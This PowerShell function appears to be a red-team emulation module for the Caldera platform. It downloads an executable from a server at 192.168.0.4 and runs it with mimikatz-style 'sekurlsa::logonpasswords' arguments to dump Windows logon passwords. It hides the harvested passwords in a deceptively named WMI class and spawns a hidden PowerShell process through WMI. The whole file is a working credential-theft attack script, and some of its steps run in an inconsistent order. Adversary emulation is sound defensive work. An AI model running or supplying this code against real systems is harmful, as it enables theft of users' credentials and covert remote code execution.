function wmidump {
# Change $server to Caldera server ip
$server = "http://192.168.0.4:8888/file/download"
$wc = New-Object System.Net.WebClient; $wc.Headers.Add("file","m.exe"); $wc.DownloadFile($server,"m.exe"); $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo; $ProcessInfo.FileName = "m.exe"; $ProcessInfo.RedirectStandardError = $true; $ProcessInfo.RedirectStandardOutput = $true; $ProcessInfo.UseShellExecute = $false; $ProcessInfo.Arguments = @("privilege::debug","sekurlsa::logonpasswords","exit"); $Process = New-Object System.Diagnostics.Process; $Process.StartInfo = $ProcessInfo; $Process.Start() | Out-Null; $output = $Process.StandardOutput.ReadToEnd(); $Pws = ""; ForEach ($line in $($output -split "`r`n")) {if ($line.Contains('Password') -and ($line.length -lt 50)) {$Pws += $line}}; $PwBytes = [System.Text.Encoding]::Unicode.GetBytes($Pws); Set-WmiInstance -Path \\.\root\cimv2:Win32_AuditCode -Argument @{Result=$PwBytes}

$newClass = New-Object System.Management.ManagementClass("root\cimv2", [String]::Empty, $null)
$newClass["__CLASS"] = "Win32_AuditCode"
$newClass.Qualifiers.Add("Static", $true)
$newClass.Properties.Add("Code", [System.Management.CimType]::String, $false)
$newClass.Properties["Code"].Qualifiers.Add("key", $true)
$newClass.Properties["Code"].Value = $wc
$newClass.Properties.Add("Result", [System.Management.CimType]::String, $false) 
$newClass.Properties["Result"].Qualifiers.Add("Key", $true) 
$newClass.Properties["Result"].Value = "" 
$newClass.Put()
Start-Sleep -s 5 
$p = [wmiclass]"\\.\root\cimv2:Win32_Process" 
$s = [wmiclass]"\\.\root\cimv2:Win32_ProcessStartup"
$s.Properties['ShowWindow'].value=$false
$code = ([wmiclass]"\\.\root\cimv2:Win32_AuditCode").Properties["Code"].value
$p.Create("powershell.exe $code")
$ps = Get-Process powershell | select starttime,id | Sort-Object -Property starttime | select -last 1 | select -expandproperty id
Get-Process powershell | select starttime,id 
$ps
Wait-Process -Id $ps
$Text = Get-WmiObject -Class Win32_AuditCode -NameSpace "root\cimv2" | Select -ExpandProperty Result
return $Text
}
